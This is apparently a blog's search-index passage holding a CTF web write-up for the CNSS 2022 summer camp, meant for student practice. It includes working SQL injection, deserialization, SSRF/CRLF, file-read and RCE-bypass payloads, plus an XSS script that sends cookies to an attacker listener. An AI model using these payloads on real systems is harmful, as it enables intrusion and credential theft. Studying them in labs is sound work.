","date":"2022-11-06","objectID":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/:3:0","tags":["CTF","WEB","Writeup"],"title":"四川省网安技能大赛2022-复现学习","uri":"/%E5%9B%9B%E5%B7%9D%E7%9C%81%E7%BD%91%E5%AE%89%E6%8A%80%E8%83%BD%E5%A4%A7%E8%B5%9B2022-%E5%A4%8D%E7%8E%B0%E5%AD%A6%E4%B9%A0/"},{"categories":["CTF"],"content":"摘要：多来点新生大跌斯哈斯哈🤤","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"\r本篇 Writeup 主要是用于写给新生复现学习的，靶机会开放到中秋应该 潜力新生多来点哩，斯哈斯哈🤤 ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:0:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"🔢 更简单的计算题 打开网站发现做了前端限制，限制了长度为 5，同时禁用了提交按钮 \u003cform method=\"post\"\u003e \u003cinput type=\"text\" name=\"re\" maxlength=\"5\"\u003e \u003cinput type=\"submit\" value=\"提交\" disabled=\"\"\u003e \u003c/form\u003e 修改后提交即可 \u003cform method=\"post\"\u003e \u003cinput type=\"text\" name=\"re\"\u003e \u003cinput type=\"submit\" value=\"提交\"\u003e \u003c/form\u003e ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:1:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"⚙️ D3buger 一个俄罗斯方块的小游戏，用 js 脚本禁用了 F12，但是我们可以先打开 F12，再进入页面，或者直接 Ctrl+S 就可得到以下源码 //屏蔽右键菜单 document.oncontextmenu = function(event) { if (window.event) { event = window.event; } try { var the = event.srcElement; if (!((the.tagName == \"INPUT\" \u0026\u0026 the.type.toLowerCase() == \"text\") || the.tagName == \"TEXTAREA\")) { return false; } return true; } catch (e) { return false; } } //屏蔽粘贴 document.onpaste = function(event) { if (window.event) { event = window.event; } try { var the = event.srcElement; if (!((the.tagName == \"INPUT\" \u0026\u0026 the.type.toLowerCase() == \"text\") || the.tagName == \"TEXTAREA\")) { return false; } return true; } catch (e) { return false; } } //屏蔽复制 //屏蔽剪切 document.oncut = function(event) { if (window.event) { event = window.event; } try { var the = event.srcElement; if (!((the.tagName == \"INPUT\" \u0026\u0026 the.type.toLowerCase() == \"text\") || the.tagName == \"TEXTAREA\")) { return false; } return true; } catch (e) { return false; } } //禁止f12 function fuckyou() { window.opener=null; window.open('','_self'); window.close(); //关闭当前窗口(防抽) window.location = \"about:blank\"; //将当前窗口跳转置空白页 } function ck() { console.profile(); console.profileEnd(); //我们判断一下profiles里面有没有东西，如果有，肯定有人按F12了，没错！！ if (console.clear) { console.clear() }; if (typeof console.profiles == \"object\") { return console.profiles.length \u003e 0; } } function hehe() { if ((window.console \u0026\u0026 (console.firebug || console.table \u0026\u0026 /firebug/i.test(console.table()))) || (typeof opera == 'object' \u0026\u0026 typeof opera.postError == 'function' \u0026\u0026 console.profile.length \u003e 0)) { fuckyou(); } if (typeof console.profiles == \"object\" \u0026\u0026 console.profiles.length \u003e 0) { fuckyou(); } } hehe(); window.onresize = function() { if (window.outerWidth - window.innerWidth \u003e 20 || window.outerHeight - window.innerHeight \u003e 100) //判断当前窗口内页高度和窗口高度，嘿嘿 fuckyou(); } document.onkeydown = function(event) { if ((event.keyCode == 112) || //屏蔽 F1 (event.keyCode == 113) || //屏蔽 F2 (event.keyCode == 114) || //屏蔽 F3 (event.keyCode == 115) || //屏蔽 F4 // (event.keyCode == 116) || //屏蔽 F5 (event.keyCode == 117) || //屏蔽 F6 (event.keyCode == 118) || //屏蔽 F7 (event.keyCode == 119) || //屏蔽 F8 (event.keyCode == 120) || //屏蔽 F9 (event.keyCode == 121) || //屏蔽 F10 (event.keyCode == 122) || //屏蔽 F11 (event.keyCode == 123) || //屏蔽 F12 ((event.ctrlKey)\u0026\u0026(event.keyCode==85))) //Ctrl + U //其实还有 Ctrl + Shift + I 和 Ctrl +Shift + C { return false; } } window.onhelp = function() { return false; } // 如你所见的， // 菜狗 xlykle 是根本不会写网页的， // 俄罗斯方块是 zhihu 抄的， // js 代码是逛博客时偷的， // 只剩 [敢 杀 我 的 马] 是我自己找的了。 // 套个娃应该是难不住你的...... // 算了还是直接给吧（记得取一下本题彩蛋😘 // CNSS{Wh@t_A_Sham3le55_thI3f} ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:2:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"🚩 Signin 打开网站后发现提示 Please Change Your Method! 那么我们抓包（还不会的新生建议下一个 Burp Suite）后修改请求方式为 POST，可以得到源码 \u003c?php error_reporting(0); require_once(\"flag.php\"); if($_SERVER['REQUEST_METHOD'] !=='POST'){ die(\"Please Change Your Method!\"); exit(); }else{ if(!isset($_POST[\"CNSS\"])){ show_source(__FILE__); } else if($_POST[\"CNSS\"] === \"join\"){ if((isset($_GET[\"web\"])) \u0026\u0026 (($_GET[\"web\"]) === \"like\")){ setcookie(\"flag\",\"0\"); if($_COOKIE['flag'] === '1'){ echo $flag; }else{show_source(__FILE__);} }else{ show_source(__FILE__); } } } 那么很简单，只需要我们根据要求传参数即可 POST /?web=like HTTP/1.1 Host: 8.130.29.197:6001 Content-Length: 9 Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 Origin: http://8.130.29.197:6001 Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 Edg/104.0.1293.70 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,en-GB;q=0.6 Cookie: flag=1 Connection: close CNSS=join ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:3:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"🔢 更坑的计算题 需要在1s内计算出正确答案并提交，通过源码，我们可以发现+1s的按钮是安慰剂， \u003cscript\u003e var fool = document.getElementById(\"fool\"); var eggs = document.getElementById(\"eggs\"); fool.count = 0; fool.onclick = function() { eggs.innerHTML = ++ this.count; } // 上帝对每个人都是公平的，你们只有 1s 的时间 \u003c/script\u003e 预期解是使用脚本提交（脚本什么的当然是py最方便了 import requests import re url = 'http://8.130.29.197:6003/' session = requests.session() response = session.get(url) getEquation = re.findall(r'\u003cp\u003e(.*?)=\u003c/p\u003e', response.text)[0] formData = {\"res\": eval(getEquation)} re2 = session.post(url, data=formData) print(re2.text) 这里需要注意的是，提交时需要使用同一个 Session，不然算式是会刷新的 ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:4:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"🇨🇳 China Flag 这题有点偏脑洞题，打开链接后有一张可以点击的图片，点击跳转到 ./china.php。 回显 我的朋友，你从哪儿找来的，联想到 HTTP 报头中的 Referer，修改Referer=http://8.130.29.197:6004/index.php 回显 你真的是土生土长的拆尼斯🐴，指的是代理需要为本地，修改X-Forwarded-For: 127.0.0.1 回显 我们中国人不吃🐏大人那套，考虑报头中中国人和🐏大人的区别可能指的是语言，修改Accept-Language: zh-CN,zh;q=0.9得到flag 最终payload： GET /china.php HTTP/1.1 Host: 8.130.29.197:6004 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 Content-Length: 0 X-Forwarded-For: 127.0.0.1 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Referer: http://8.130.29.197:6004/index.php Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:5:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"🤥 Trick 访问页面直接得到源码 \u003c?php error_reporting(0); require_once(\"flag.php\"); show_source(__FILE__); $pass = '0e0'; $md55 = $_COOKIE['token']; $md55 = md5($md55); if(md5($md55) == $pass){ if(isset($_GET['query'])){ $before = $_GET['query']; $med = 'filter'; $after = preg_replace( \"/$med/\", '', $before ); if($after === $med){ echo $flag1; } } $verify = $_GET['verify']; } extract($_POST); if(md5($verify) === $pass){ echo $$verify; } ?\u003e 逐行审计，我们首先需要将传入的 token 进行两次 md5 加密后 == 0e0，这里发现是弱比较 弱比较时，变量类型会强制转化，0e开头的纯数字字符串会被转化为科学计数法数字 那么就有 ‘0e1145141919810’ == 0e0 贴一下爆破脚本（建议自己跑一遍嗷 import string import hashlib payload = string.ascii_letters + string.digits def calc_md5(s): md5 = hashlib.md5(s.encode(\"utf-8\")).hexdigest() md5_double = hashlib.md5(md5.encode(\"utf-8\")).hexdigest() if (md5_double[0:2] == \"0e\" and md5_double[2:].isdigit()): print(s) def getstr(payload, s, slen): if (len(s) == slen): calc_md5(s) return s for i in payload: sl = s + i getstr(payload, sl, slen) # 字符串长度从0到30，肯定找得到 for i in range(3, 30): getstr(payload, '', i) 这样我们就绕过了第一个 if，接下来需要我们 GET 一个 query 使得经过 preg_replace 单次过滤后为 filter。 考虑双写绕过，即?query=ffilterilter，这样就得到了 $flag1 然后需要再 GET 一个 verify，这里发现有一行可疑代码extract($_POST);，直接 Google extract 会导致变量被覆盖，POST 则使得变量可控 那么我们只需要 POST 使pass=md5(verify)即可绕过 再观察最后一行 echo $$verify;，发现有两个 $$，这就允许我们设置 verify 为某一个变量，再获得这一个变量的值。考虑前半个 flag 为 $flag1，那么我们可以猜测后半部分 flag 为 $flag2 那么后半部分的 payload 为 GET verify=flag2，POST pass=9a48ddad2656385fce58af47a0ef56cf ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:6:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"⬛ Black Page F12 发现提示 \u003c?phps $file = $_GET[\"file\"]; $blacklist = \"(**blacklist**)\"; if (preg_match(\"/\".$blacklist.\"/is\",$file) == 1){ exit(\"Nooo,You can't read it.\"); }else{ include $file; } //你能读到 mybackdoor.php 吗？ 尝试 ?file=mybackdoor.php，但是没有发现回显。 因为正常读取时是无法读取它的源码的，它会被当做 php 文件执行 php://filter 是 php 中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取 名称 描述 备注 resource=\u003c要过滤的数据流\u003e 指定了你要筛选过滤的数据流。 必选 read=\u003c读链的筛选列表\u003e 可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选 write=\u003c写链的筛选列表\u003e 可以设定一个或多个过滤器名称，以管道符（|）分隔。 可选 \u003c；两个链的筛选列表\u003e 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 可选 所以可以使用 ?file=php://filter/convert.base64-encode/resource=mybackdoor.php得到 base64 加密的源码 PD9waHAKZXJyb3JfcmVwb3J0aW5nKDApOwpmdW5jdGlvbiBibGFja2xpc3QoJGNtZCl7CiAgJGZpbHRlciA9ICIoXFw8fFxcPnxGbDRnfHBocHxjdXJsfCB8MHh8XFxcXHxweXRob258Z2NjfGxlc3N8cm9vdHxldGN8cGFzc3xodHRwfGZ0cHxjZHx0Y3B8dWRwfGNhdHzDl3xmbGFnfHBofGhwfHdnZXR8dHlwZXx0eXxcXCRcXHtJRlNcXH18aW5kZXh8XFwqKSI7CiAgaWYgKHByZWdfbWF0Y2goIi8iLiRmaWx0ZXIuIi9pcyIsJGNtZCk9PTEpeyAgCiAgICAgIGV4aXQoJ0dvIG91dCEgVGhpcyBibGFjayBwYWdlIGRvZXMgbm90IGJlbG9uZyB0byB5b3UhJyk7CiAgfQogIGVsc2V7CiAgICBzeXN0ZW0oJGNtZCk7CiAgfQp9CmJsYWNrbGlzdCgkX0dFVFsnY21kJ10pOwo/Pg== 解密后得到源码： \u003c?php error_reporting(0); function blacklist($cmd){ $filter = \"(\\\\\u003c|\\\\\u003e|Fl4g|php|curl| |0x|\\\\\\\\|python|gcc|less|root|etc|pass|http|ftp|cd|tcp|udp|cat|×|flag|ph|hp|wget|type|ty|\\\\$\\\\{IFS\\\\}|index|\\\\*)\"; if (preg_match(\"/\".$filter.\"/is\",$cmd)==1){ exit('Go out! This black page does not belong to you!'); } else{ system($cmd); } } blacklist($_GET['cmd']); ?\u003e 是黑名单过滤的 rce，那么我们只需要随便绕就行了 先读目录，发现空格被过滤了，可以用 %09 绕过，/mybackdoor.php?cmd=ls%09/ 发现根目录下有文件 Fl4g_is_here，使用 tac 和 ? 可以绕过，/mybackdoor.php?cmd=tac%09/Fl4?_is_here ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:7:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"☯️ 太极掌门人 访问得到源码： \u003c?php error_reporting(0); show_source(__FILE__); function deleteDir($path) { if (is_dir($path)) { $dirs = scandir($path); foreach ($dirs as $dir) { if ($dir != '.' \u0026\u0026 $dir != '..') { $sonDir = $path.'/'.$dir; if (is_dir($sonDir)) { deleteDir($sonDir); @rmdir($sonDir); } elseif ($sonDir !== './index.php' \u0026\u0026 $sonDir !== './flag.php') { @unlink($sonDir); } } } @rmdir($path); } } $devil = '\u003c?php exit;?\u003e'; $goods = $_POST['goods']; file_put_contents($_POST['train'], $devil . $goods); sleep(1); deleteDir('.'); ?\u003e 定义的一大段函数是用来删除网站目录下你放进去的文件的，而重点可利用的在最后面几行 $goods = $_POST['goods']; file_put_contents($_POST['train'], $devil . $goods); sleep(1); deleteDir('.'); 好，发现可疑代码file_put_contents，开始 Google train 作为写入路径，$devil.$goods 作为写入内容。这里我们可以使用 php://filter/write=convert.base64-decode/resource= 语句将内容解密后再写入执行代码，这样就可以把开头的退出代码转换为乱码过滤掉。需要注意的是，base64 是分组加密的，所以为了解密时消除开头的 $devil 且不影响后面的写入内容，我们需要在开头补上一位。 然后便可以在 sleep(1) 内访问，手速快的话可以直接切，预期解是多线程的脚本： import requests import base64 from threading import Thread from time import sleep url1 = 'http://8.130.29.197:6002/' url2 = 'http://8.130.29.197:6002/a.php' data = { 'goods': b'a'+base64.b64encode(b'\u003c?php system(\"cat flag.php\");?\u003e'), 'train': 'php://filter/write=convert.base64-decode/resource=a.php' } t = Thread(target=requests.post, args=(url1, data)) t.start() sleep(0.1) x = requests.get(url2) print(x.text) ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:8:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"🥳 To_be_Admin 打开网址，看到两个提示 Go to Your page 和 Access /read to read file what you want. 点击第一个按钮跳转 ./admin 发现权限不够，那么服务器端是依靠什么判断我们是不是 admin 的呢？发现 cookie 内有 token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.STZdzBL4eUV1eQS8V9eJ96m0Q5LTwqBhFw5stXTk89M （直接开始 Google 发现我们需要 jwt 伪造 admin 身份，而伪造需要密钥才能验证。 在 /read 界面，我们可以通过/read?file=/proc/self/environ读取环境变量，发现 KEY = THIS_is_a_KEY。 那么在 JSON Web Tokens 修改 jwt 信息，再访问 /admin 即可 ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:9:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"🏃 第一次跑路 打开是注册界面 先随便输点啥，点击右侧的注册，跳转回显 别想了，此路不通 那么我们再看看登录界面，尝试 sql 注入，输入 username = admin’\u0026password = 123 发现回显 我超，我👖呢？ 说明可能存在 sqli，使用万能账号登录 username = admin'or+1=1#\u0026password = 123 跳转到了新的页面，尝试过后发现 Cookie: username = cnss 可能存在 Cookie 的 sqli。 尝试 username = cnss’# 但是发现回显是随机的成功访问或者失败，猜测后端有随机过滤（这里是为了卡 sqlmap），但依然可以 sqli 接下来就是套路化的 sqli 了，先爆库名 username=-1'union select group_concat(schema_name) from information_schema.schemata# 再爆表名 username=-1'union select group_concat(table_name) from information_schema.tables where table_schema=database()# 再爆列名 username=-1'union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='user'# username=-1'union select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='fulage'# 最后读取 flag username = -1'union select bio from CN55.fulage where id =4# 这题里面其实还有 fake flag，但是我这里略去了。希望能够自己摸索一下。 或者可以使用 sqlmap 一把梭了 python sqlmap.py -u http://8.130.29.197:6011/welcome.php --cookie \"username=cnss\" --level 2 --dbs --hex python sqlmap.py -u http://8.130.29.197:6011/welcome.php --cookie \"username=cnss\" --level 2 -D CN55 --tables --hex python sqlmap.py -u http://8.130.29.197:6011/welcome.php --cookie \"username=cnss\" --level 2 -D CN55 -T fulage --dump --hex ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:10:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"🤐 To_be_Admin_Again 还是直接审查源码 // index.php \u003c?php error_reporting(0); ini_set('session.serialize_handler','php'); session_start(); highlight_file(__FILE__); class CNSS{ private $username = 'guest'; private $code = 'phpinfo();'; public function __construct(){ $this-\u003eusername = $username; $this-\u003ecode = $cmd; } function __wakeup(){ $this-\u003eusername = 'guest'; } function __destruct(){ if($this-\u003eusername === 'admin'){ eval($this-\u003ecode); } } } // save.php \u003c?php error_reporting(0); ini_set('session.serialize_handler','php_serialize'); session_start(); highlight_file(__FILE__); if (isset($_GET['cnss'])) { $_SESSION['cnss'] = $_GET['cnss']; } 发现可疑代码ini_set('session.serialize_handler','php_serialize');（开搜 发现这里可能存在Session序列化选择器漏洞，可以实现反序列化使 $code 可控 这里值得注意的是，在 class CNSS 中，$username,$code 的类型都是 private。反序列化时需要在属性名称前面加上%00类名%00。这里为了避免直接序列化%00显示乱码的问题，我们可以输出urlencode后的payload \u003c?php class CNSS { private $username = 'admin'; private $code = 'system(\"ls /\");'; } $a = new CNSS; echo '|' . urlencode(serialize($a)); ?\u003e 然后修改属性数以绕过 weakup（反序列化漏洞的基本知识 得到： |O%3A4%3A%22CNSS%22%3A3%3A%7Bs%3A14%3A%22%00CNSS%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A10%3A%22%00CNSS%00code%22%3Bs%3A15%3A%22system%28%22ls+%2F%22%29%3B%22%3B%7D 发现 flag 在根目录下，修改执行代码为 cat /flag 所以最终步骤为先访问 http://8.130.29.197:6008/save.php?cnss=|O%3A4%3A%22CNSS%22%3A3%3A%7Bs%3A14%3A%22%00CNSS%00username%22%3Bs%3A5%3A%22admin%22%3Bs%3A10%3A%22%00CNSS%00code%22%3Bs%3A20%3A%22system%28%22cat+%2Fflag%22%29%3B%22%3B%7D 再访问 http://8.130.29.197:6008 得到 flag ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:11:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"😰 To_be_Admin_Again_and_Again 查看 html 源码发现 Message 文本框可以通过闭合 textarea 造成 XSS \u003ctextarea id=\"message\" name=\"message\" class=\"form-control input\" rows=\"8\"\u003e\u003c/textarea\u003e 在 Message 文本框写入如下内容点击 Preview 按钮，发现 JS 代码被执行了 \u003c/textarea\u003e\u003cscript\u003ealert(1)\u003c/script\u003e 构造如下 JS 将 Cookie 发送到服务器记录 var img = new Image(); var cookie = encodeURIComponent(document.cookie); img.src = 'http://10.0.0.1:7777/?cookie=' + cookie; document.body.appendChild(img); 写个脚本爆破 SHA256 import hashlib import string table = string.ascii_letters + string.digits def crack(h): for a in table: for b in table: for c in table: for d in table: t = a + b + c + d if hashlib.sha256(t.encode()).hexdigest()[:6] == h: return t return None print(crack('b62936')) 提交后可以拿到 bot 访问的时候使用的 Cookie [root@iZ2zeglb8irh5gnt1c6x7dZ ~]# nc -lvvp 7777 Ncat: Version 7.50 ( https://nmap.org/ncat ) Ncat: Listening on :::7777 Ncat: Listening on 0.0.0.0:7777 Ncat: Connection from 1.117.6.207. Ncat: Connection from 1.117.6.207:39600. GET /?cookie=session%3DeyJhZG1pbiI6dHJ1ZX0.YwzeZQ.AXZf3l60naksoRZHWyy0frUZFEI HTTP/1.1 Host: 101.200.202.216:7777 Connection: keep-alive User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/90.0.4430.212 Safari/537.36 Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8 Referer: http://127.0.0.1:5000/ Accept-Encoding: gzip, deflate Accept-Language: en-US 替换 Cookie 访问 /admin 拿到 flag ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:12:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"🤯To_be_Admin_Again_and_Again_and_Again 尝试使用 file 协议 读取文件，可以读取，但是读取不到 /flag，考虑 flag 不在这个文件 http://1.117.6.207:65006/request?url=file:///etc/passwd 看下服务端的进程是通过什么命令启动的 http://1.117.6.207:65006/request?url=file:///proc/self/cmdline python app.py 尝试读源码， 并没有发现 flag， 考虑 flag 在内网的其他主机上 http://1.117.6.207:65006/request?url=file:///proc/self/cwd/app.py import urllib.parse import urllib.request from flask import Flask, request, render_template app = Flask(__name__) SCHEME = ['http', 'https', 'file'] @app.route('/') def index(): return render_template('index.html') @app.route('/request') def req(): url = request.args.get('url') if url: if urllib.parse.urlparse(url).scheme not in SCHEME: return 'Invalid scheme' with urllib.request.urlopen(url) as f: return f.read() else: return 'Please enter a URL' if __name__ == '__main__': app.run('0.0.0.0') 读取 arp 记录，发现 172.16.233.233 有 MAC 地址 （另一个是网关），考虑到 Flask 默认端口为 5000，尝试访问 http://172.16.233.233:5000 http://1.117.6.207:65006/request?url=file:///proc/net/arp IP address HW type Flags HW address Mask Device 172.16.233.245 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.236 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.219 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.225 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.5 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.230 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.221 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.251 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.248 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.253 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.242 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.233 0x1 0x2 02:42:ac:10:e9:e9 * eth0 172.16.233.247 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.238 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.227 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.224 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.223 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.229 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.220 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.250 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.252 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.235 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.241 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.232 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.246 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.237 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.1 0x1 0x2 02:42:3c:46:4a:85 * eth0 172.16.233.226 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.231 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.222 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.228 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.249 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.254 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.243 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.234 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.23 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.240 0x1 0x0 00:00:00:00:00:00 * eth0 172.16.233.239 0x1 0x0 00:00:00:00:00:00 * eth0 顺利拿到内网主机的源码， 分析后发现，请求的时候需要带上 Cookie 并且要有 admin=6a9e47ca067b07047e3d571512ec4f82，考虑 urlib的 CLRF 漏洞 CVE-2019-9740 和 CVE-2019-9947 http://1.117.6.207:65006/request?url=http://172.16.233.233:5000 Try /source ? http://1.117.6.207:65006/request?url=http://172.16.233.233:5000/source from flask import Flask, request app = Flask(__name__) @app.route('/') def index(): return 'Try /source ?' @app.route('/source') def source(): with open('app.py') as f: return f.read() @app.route('/admin') def admin(): c = request.cookies.get('admin') if c and c == '6a9e47ca067b07047e3d571512ec4f82': with open('/flag') as f: return f.read() else: return 'Only admin can read the flag' if __name__ == '__main__': app.run('0.0.0.0') 成功拿到 flag http://1.117.6.207:65006/request?url=http://172.16.233.233:5000/admin%20HTTP/1.1%0d%0aCookie:%20admin=6a9e47ca067b07047e3d571512ec4f82%0d%0aheader:%20 CNSS{ssrf\u0026urllib_ar3_dddddd4nger0us} ","date":"2022-08-28","objectID":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/:13:0","tags":["CTF","WEB","Writeup"],"title":"CNSS2022夏令营_WEB_Writeup","uri":"/cnss%E5%A4%8F%E4%BB%A4%E8%90%A5_web_writeup/"},{"categories":["CTF"],"content":"💉 Inject me 下载附件，先在本地跑起来 java -jar summer-0.0.1.jar 然后用 jadx 反编译，注意到配置文件 Resources/BOOT-INF/classes/application.yml server: address: 0.0.0.0 port: 5000 spring: application: name: cnss-summer config: method: SUMMMMMER auth: len: 4 expire: 5000 command: allow: 127.0.0.1 blacklist: rm, cat, tac, mv, touch, mkdir, rmdir, whoami, ls 确认可以访问 http://127.0.0.1:5000 接下来分析一下 Controller ，定位到 com.cnss.summer.controller 包下，主要看一下注解 @RequestMapping @GetMapping @PostMapping ，发现下面三个注册的路由 // /cnss/summer/login public ResponseEntity login(@NotNull @Valid @RequestBody LoginParam credentials, HttpServletRequest request) { String uuid = UUID.randomUUID().toString(); log.info(\"uuid: {}\", uuid); String uuid2 = DigestUtils.md5DigestAsHex(uuid.getBytes(StandardCharsets.UTF_8)); request.getSession().setAttribute(\"username\", credentials.getUsername()); request.getSession().setAttribute(\"token\", uuid2); request.getSession().setAttribute(\"timestamp\", Long.valueOf(System.currentTimeMillis())); HashMap\u003cString, String\u003e map = new HashMap\u003c\u003e(); map.put(\"token\", uuid2); return new ResponseEntity(\"200\", \"Login success!\", map); } // /cnss/summer/parse public ResponseEntity parse(@NotNull @RequestBody ParseParam payload, @RequestParam(\"nammmmme\") @NotEmpty @Valid String username, HttpServletRequest request) throws Exception { String username1 = (String) request.getSession().getAttribute(\"username\"); if (!Objects.equals(username, username1) || 